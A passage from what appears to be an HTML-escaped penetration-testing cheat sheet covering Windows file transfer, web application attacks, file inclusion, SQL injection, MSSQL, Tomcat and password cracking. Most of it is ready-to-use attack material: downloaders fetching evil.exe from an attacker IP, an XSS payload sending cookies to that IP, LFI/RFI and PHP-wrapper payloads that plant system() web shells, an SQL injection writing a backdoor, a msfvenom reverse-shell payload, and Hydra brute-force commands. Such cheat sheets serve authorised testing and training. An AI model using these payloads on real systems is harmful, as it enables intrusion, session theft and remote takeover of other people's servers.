&lt;&#x2F;span&gt;&lt;span&gt;echo ts.Close &amp;gt;&amp;gt; wget.vbs
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Then to execute the script wget.vbs script:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;cscript wget.vbs http:&#x2F;&#x2F;10.11.0.219&#x2F;evil.exe evil.exe
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Powershell script that acts like wget:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;powershell&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-powershell &quot;&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span&gt;echo $&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;storageDir &lt;&#x2F;span&gt;&lt;span&gt;= $pwd &amp;gt; wget.ps1
&lt;&#x2F;span&gt;&lt;span&gt;echo $&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;webclient &lt;&#x2F;span&gt;&lt;span&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;New-Object&lt;&#x2F;span&gt;&lt;span&gt; System.Net.WebClient &amp;gt;&amp;gt;wget.ps1
&lt;&#x2F;span&gt;&lt;span&gt;echo $&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;url &lt;&#x2F;span&gt;&lt;span&gt;= &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;http:&#x2F;&#x2F;10.11.0.219&#x2F;evil.exe&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; &amp;gt;&amp;gt;wget.ps1
&lt;&#x2F;span&gt;&lt;span&gt;echo $&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;file &lt;&#x2F;span&gt;&lt;span&gt;= &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;new-exploit.exe&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; &amp;gt;&amp;gt;wget.ps1
&lt;&#x2F;span&gt;&lt;span&gt;echo $&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;webclient.DownloadFile&lt;&#x2F;span&gt;&lt;span&gt;($&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;url&lt;&#x2F;span&gt;&lt;span&gt;,$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;file&lt;&#x2F;span&gt;&lt;span&gt;) &amp;gt;&amp;gt;wget.ps1
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;To execute the wget.ps1 file:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;File transfer using &lt;code&gt;certutil.exe&lt;&#x2F;code&gt;:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;certutil.exe -urlcache -split -f &amp;quot;http:&#x2F;&#x2F;10.11.0.219&#x2F;fgdump.exe&amp;quot; fgdump.exe
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;code&gt;Debug.exe&lt;&#x2F;code&gt; is an assembler, disassembler, and hex dumping tool:&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;locate nc.exe|grep binaries
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;cp &#x2F;usr&#x2F;share&#x2F;windows-binaries&#x2F;nc.exe .
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;ls -l nc.exe
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;upx -9 nc.exe - upx compacts the file size
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;locate exe2bat
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;cp &#x2F;usr&#x2F;share&#x2F;windows-binaries&#x2F;exe2bat.exe .
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;wine exe2bat.exe nc.exe nc.txt
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Convert .exe to .txt file for victim&#x27;s debug.exe to be unpacked.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;hr &#x2F;&gt;
&lt;h2 id=&quot;web-application-attacks&quot;&gt;Web Application Attacks&lt;&#x2F;h2&gt;
&lt;p&gt;Test to see if site is vulnerable to XSS:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;&amp;lt;script&amp;gt;alert(&amp;quot;XSS&amp;quot;)&amp;lt;&#x2F;script&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Stealing cookies and session information:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;&amp;lt;script&amp;gt;new Image().src=&amp;quot;http:&#x2F;&#x2F;10.11.0.219&#x2F;bogus.php?output=&amp;quot;+document.cookie;&amp;lt;&#x2F;script&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Once the script tag is in place, run &#x27;&#x27;nc&#x27;&#x27; to capture the cookie when the user loads the page:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;nc -nvlp 80
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Bypass file upload filtering and restrictions:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;php - phtml, .php, .php3, .php4, .php5, and .inc
&lt;&#x2F;span&gt;&lt;span&gt;asp - asp, .aspx
&lt;&#x2F;span&gt;&lt;span&gt;perl - .pl, .pm, .cgi, .lib
&lt;&#x2F;span&gt;&lt;span&gt;jsp - .jsp, .jspx, .jsw, .jsv, and .jspf
&lt;&#x2F;span&gt;&lt;span&gt;Coldfusion - .cfm, .cfml, .cfc, .dbm
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;hr &#x2F;&gt;
&lt;h2 id=&quot;local-file-inclusion-lfi&quot;&gt;Local File Inclusion (LFI)&lt;&#x2F;h2&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;swisskyrepo&#x2F;PayloadsAllTheThings&#x2F;blob&#x2F;master&#x2F;File%20Inclusion&#x2F;README.md&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;swisskyrepo&#x2F;PayloadsAllTheThings&#x2F;blob&#x2F;master&#x2F;File%20Inclusion&#x2F;README.md&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;In the following examples we include the &#x2F;etc&#x2F;passwd file.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;http:&#x2F;&#x2F;example.com&#x2F;index.php?page=..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h4 id=&quot;null-byte&quot;&gt;Null Byte&lt;&#x2F;h4&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;http:&#x2F;&#x2F;example.com&#x2F;index.php?page=..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd%00
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h4 id=&quot;double-encoding&quot;&gt;Double encoding&lt;&#x2F;h4&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;http:&#x2F;&#x2F;example.com&#x2F;index.php?page=%252e%252e%252fetc%252fpasswd
&lt;&#x2F;span&gt;&lt;span&gt;http:&#x2F;&#x2F;example.com&#x2F;index.php?page=%252e%252e%252fetc%252fpasswd%00
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h4 id=&quot;path-and-dot-truncation&quot;&gt;Path and dot truncation&lt;&#x2F;h4&gt;
&lt;p&gt;On most PHP installations a filename longer than 4096 bytes will be cut off so any excess chars will be thrown away.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;http:&#x2F;&#x2F;example.com&#x2F;index.php?page=..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd............[ADD MORE]
&lt;&#x2F;span&gt;&lt;span&gt;http:&#x2F;&#x2F;example.com&#x2F;index.php?page=..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd\.\.\.\.\.\.[ADD MORE]
&lt;&#x2F;span&gt;&lt;span&gt;http:&#x2F;&#x2F;example.com&#x2F;index.php?page=..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.[ADD MORE]
&lt;&#x2F;span&gt;&lt;span&gt;http:&#x2F;&#x2F;example.com&#x2F;index.php?page=..&#x2F;..&#x2F;..&#x2F;[ADD MORE]..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h5 id=&quot;filter-bypass-tricks&quot;&gt;Filter bypass tricks&lt;&#x2F;h5&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;http:&#x2F;&#x2F;example.com&#x2F;index.php?page=....&#x2F;&#x2F;....&#x2F;&#x2F;etc&#x2F;passwd
&lt;&#x2F;span&gt;&lt;span&gt;http:&#x2F;&#x2F;example.com&#x2F;index.php?page=..&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;..&#x2F;&#x2F;&#x2F;&#x2F;..&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;etc&#x2F;passwd
&lt;&#x2F;span&gt;&lt;span&gt;http:&#x2F;&#x2F;example.com&#x2F;index.php?page=&#x2F;%5C..&#x2F;%5C..&#x2F;%5C..&#x2F;%5C..&#x2F;%5C..&#x2F;%5C..&#x2F;%5C..&#x2F;%5C..&#x2F;%5C..&#x2F;%5C..&#x2F;%5C..&#x2F;etc
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;hr &#x2F;&gt;
&lt;h2 id=&quot;remote-file-inclusion-rfi&quot;&gt;Remote File Inclusion (RFI)&lt;&#x2F;h2&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;swisskyrepo&#x2F;PayloadsAllTheThings&#x2F;blob&#x2F;master&#x2F;File%20Inclusion&#x2F;README.md&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;swisskyrepo&#x2F;PayloadsAllTheThings&#x2F;blob&#x2F;master&#x2F;File%20Inclusion&#x2F;README.md&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Most of the filter bypasses from LFI section can be reused for RFI.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;http:&#x2F;&#x2F;example.com&#x2F;index.php?page=http:&#x2F;&#x2F;evil.com&#x2F;shell.txt
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;null-byte-1&quot;&gt;Null byte&lt;&#x2F;h3&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;http:&#x2F;&#x2F;example.com&#x2F;index.php?page=http:&#x2F;&#x2F;evil.com&#x2F;shell.txt%00
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;double-encoding-1&quot;&gt;Double encoding&lt;&#x2F;h3&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;http:&#x2F;&#x2F;example.com&#x2F;index.php?page=http:%252f%252fevil.com%252fshell.txt
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;bypass-allow-url-include&quot;&gt;Bypass allow_url_include&lt;&#x2F;h3&gt;
&lt;p&gt;When allow_url_include and &lt;code&gt;allow_url_fopen&lt;&#x2F;code&gt; are set to &lt;code&gt;Off&lt;&#x2F;code&gt;. It is still possible to include a remote file on Windows box using the smb protocol.&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Create a share open to everyone&lt;&#x2F;li&gt;
&lt;li&gt;Write a PHP code inside a file : shell.php&lt;&#x2F;li&gt;
&lt;li&gt;Include it &lt;code&gt;%%http:&#x2F;&#x2F;example.com&#x2F;index.php?page=\\10.0.0.1\share\shell.php%%&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;hr &#x2F;&gt;
&lt;h2 id=&quot;lfi-rfi-using-wrappers&quot;&gt;LFI &#x2F; RFI using wrappers&lt;&#x2F;h2&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;swisskyrepo&#x2F;PayloadsAllTheThings&#x2F;blob&#x2F;master&#x2F;File%20Inclusion&#x2F;README.md&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;swisskyrepo&#x2F;PayloadsAllTheThings&#x2F;blob&#x2F;master&#x2F;File%20Inclusion&#x2F;README.md&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;h3 id=&quot;wrapper-php-filter&quot;&gt;Wrapper php:&#x2F;&#x2F;filter&lt;&#x2F;h3&gt;
&lt;p&gt;The part %%php:&#x2F;&#x2F;filter%% is case insensitive&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;http:&#x2F;&#x2F;example.com&#x2F;index.php?page=php:&#x2F;&#x2F;filter&#x2F;read=string.rot13&#x2F;resource=index.php
&lt;&#x2F;span&gt;&lt;span&gt;http:&#x2F;&#x2F;example.com&#x2F;index.php?page=php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource=index.php
&lt;&#x2F;span&gt;&lt;span&gt;http:&#x2F;&#x2F;example.com&#x2F;index.php?page=pHp:&#x2F;&#x2F;FilTer&#x2F;convert.base64-encode&#x2F;resource=index.php
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;can be chained with a compression wrapper for large files.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;http:&#x2F;&#x2F;example.com&#x2F;index.php?page=php:&#x2F;&#x2F;filter&#x2F;zlib.deflate&#x2F;convert.base64-encode&#x2F;resource=&#x2F;etc&#x2F;passwd
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;NOTE: Wrappers can be chained:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode|convert.base64-decode|convert.base64-decode&#x2F;resource=%s&amp;#39;&amp;#39;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;wrapper-zip&quot;&gt;Wrapper zip:&#x2F;&#x2F;&lt;&#x2F;h3&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;echo &amp;quot;&amp;lt;pre&amp;gt;&amp;lt;?php system($_GET[&amp;#39;cmd&amp;#39;]); ?&amp;gt;&amp;lt;&#x2F;pre&amp;gt;&amp;quot; &amp;gt; payload.php;  
&lt;&#x2F;span&gt;&lt;span&gt;zip payload.zip payload.php;
&lt;&#x2F;span&gt;&lt;span&gt;mv payload.zip shell.jpg;
&lt;&#x2F;span&gt;&lt;span&gt;rm payload.php
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;http:&#x2F;&#x2F;example.com&#x2F;index.php?page=zip:&#x2F;&#x2F;shell.jpg%23payload.php
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;wrapper-data&quot;&gt;Wrapper data:&#x2F;&#x2F;&lt;&#x2F;h3&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;http:&#x2F;&#x2F;example.net&#x2F;?page=data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;NOTE: the payload is &amp;quot;&amp;lt;?php system($_GET[&amp;#39;cmd&amp;#39;]);echo &amp;#39;Shell done !&amp;#39;; ?&amp;gt;&amp;quot;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Fun fact: you can trigger an XSS and bypass the Chrome Auditor with: &lt;code&gt;http:&#x2F;&#x2F;example.com&#x2F;index.php?page=data:application&#x2F;x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;h3 id=&quot;wrapper-expect&quot;&gt;Wrapper expect:&#x2F;&#x2F;&lt;&#x2F;h3&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;http:&#x2F;&#x2F;example.com&#x2F;index.php?page=expect:&#x2F;&#x2F;id
&lt;&#x2F;span&gt;&lt;span&gt;http:&#x2F;&#x2F;example.com&#x2F;index.php?page=expect:&#x2F;&#x2F;ls
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;wrapper-input&quot;&gt;Wrapper input:&#x2F;&#x2F;&lt;&#x2F;h3&gt;
&lt;p&gt;Specify your payload in the POST parameters&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;http:&#x2F;&#x2F;example.com&#x2F;index.php?page=php:&#x2F;&#x2F;input
&lt;&#x2F;span&gt;&lt;span&gt;POST DATA: &amp;lt;?php system(&amp;#39;id&amp;#39;); ?&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;wrapper-phar&quot;&gt;Wrapper phar:&#x2F;&#x2F;&lt;&#x2F;h3&gt;
&lt;p&gt;Create a phar file with a serialized object in its meta-data.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;&#x2F;&#x2F; create new Phar
&lt;&#x2F;span&gt;&lt;span&gt;$phar = new Phar(&amp;#39;test.phar&amp;#39;);
&lt;&#x2F;span&gt;&lt;span&gt;$phar-&amp;gt;startBuffering();
&lt;&#x2F;span&gt;&lt;span&gt;$phar-&amp;gt;addFromString(&amp;#39;test.txt&amp;#39;, &amp;#39;text&amp;#39;);
&lt;&#x2F;span&gt;&lt;span&gt;$phar-&amp;gt;setStub(&amp;#39;&amp;lt;?php __HALT_COMPILER(); ? &amp;gt;&amp;#39;);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;&#x2F; add object of any class as meta data
&lt;&#x2F;span&gt;&lt;span&gt;class AnyClass {}
&lt;&#x2F;span&gt;&lt;span&gt;$object = new AnyClass;
&lt;&#x2F;span&gt;&lt;span&gt;$object-&amp;gt;data = &amp;#39;rips&amp;#39;;
&lt;&#x2F;span&gt;&lt;span&gt;$phar-&amp;gt;setMetadata($object);
&lt;&#x2F;span&gt;&lt;span&gt;$phar-&amp;gt;stopBuffering();
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;If a file operation is now performed on our existing Phar file via the %%phar:&#x2F;&#x2F;%% wrapper, then its serialized meta data is unserialized. If this application has a class named AnyClass and it has the magic method __destruct() or __wakeup() defined, then those methods are automatically invoked&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;class AnyClass {
&lt;&#x2F;span&gt;&lt;span&gt;    function __destruct() {
&lt;&#x2F;span&gt;&lt;span&gt;        echo $this-&amp;gt;data;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;&#x2F; output: rips
&lt;&#x2F;span&gt;&lt;span&gt;include(&amp;#39;phar:&#x2F;&#x2F;test.phar&amp;#39;);
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;NOTE: The unserialize is triggered for the &lt;code&gt;%%phar:&#x2F;&#x2F;%%&lt;&#x2F;code&gt; wrapper in any file operation, file_exists and many more.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;sql-injection&quot;&gt;SQL Injection&lt;&#x2F;h2&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;pentestlab.blog&#x2F;2012&#x2F;12&#x2F;24&#x2F;sql-injection-authentication-bypass-cheat-sheet&#x2F;&quot;&gt;https:&#x2F;&#x2F;pentestlab.blog&#x2F;2012&#x2F;12&#x2F;24&#x2F;sql-injection-authentication-bypass-cheat-sheet&#x2F;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;POST request SQL injection:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;q=injection&amp;amp;lang=en &amp;#39;union all select 1,2,3,4,&amp;quot;&amp;lt;?php echo shell_exec($_GET[&amp;#39;cmd&amp;#39;]);?&amp;gt;&amp;quot;,6 into OUTFILE &amp;#39;c:&#x2F;xampp&#x2F;htdocs&#x2F;bd.php%00&amp;#39;&amp;#39;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;hr &#x2F;&gt;
&lt;h2 id=&quot;mssql-commands&quot;&gt;MSSQL Commands&lt;&#x2F;h2&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.hackingloops.com&#x2F;how-to-hack-windows-servers-using-privilege-escalation&#x2F;&quot;&gt;https:&#x2F;&#x2F;www.hackingloops.com&#x2F;how-to-hack-windows-servers-using-privilege-escalation&#x2F;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Connect MSSQL server:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;sqsh -S 10.11.1.227:27900 -U sa -P password
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Check currently logged in user:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;exec xp_cmdshell &amp;#39;whoami&amp;#39;
&lt;&#x2F;span&gt;&lt;span&gt;go
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;If you have SYSTEM privileges, proceed with uploading reverse shell payload and execute.&lt;&#x2F;p&gt;
&lt;hr &#x2F;&gt;
&lt;h2 id=&quot;tomcat-manager&quot;&gt;Tomcat Manager&lt;&#x2F;h2&gt;
&lt;p&gt;Create reverse shell payload using WAR format:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;msfvenom -p java&#x2F;jsp_shell_reverse_tcp LHOST=10.11.0.219 LPORT=4444 -f war -o reverse.war
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;hr &#x2F;&gt;
&lt;h2 id=&quot;brute-force-and-cracking&quot;&gt;Brute Force and Cracking&lt;&#x2F;h2&gt;
&lt;p&gt;Hydra supported services:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;adam6500 asterisk cisco cisco-enable cvs firebird ftp ftps http[s]-{head|get|post} http[s]-{get|post}-form http-proxy
&lt;&#x2F;span&gt;&lt;span&gt;http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5][s] mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres
&lt;&#x2F;span&gt;&lt;span&gt;radmin2 rdp redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Hydra HTTP-POST-FORM request:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;hydra -l root@localhost -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;word.txt 10.11.1.39 http-post-form &amp;quot;&#x2F;otrs&#x2F;index.pl:Action=Login&amp;amp;RequestedURL=&amp;amp;Lang=en&amp;amp;TimeOffset=300&amp;amp;User=^USER^&amp;amp;Password=^PASS^:Login Failed&amp;quot; -V
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Find Hash type:&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;hashkiller.co.uk&quot;&gt;https:&#x2F;&#x2F;hashkiller.co.uk&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Cracking passwords using CPU:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;john --wordlist=&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt 127.0.0.1.pwdump
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Cracking passwords using GPU:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;hashcat -m 500 -a 0 -o output.txt -remove hashes.txt &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Cracking &#x2F;etc&#x2F;shadow:&lt;&#x2F;p&gt;
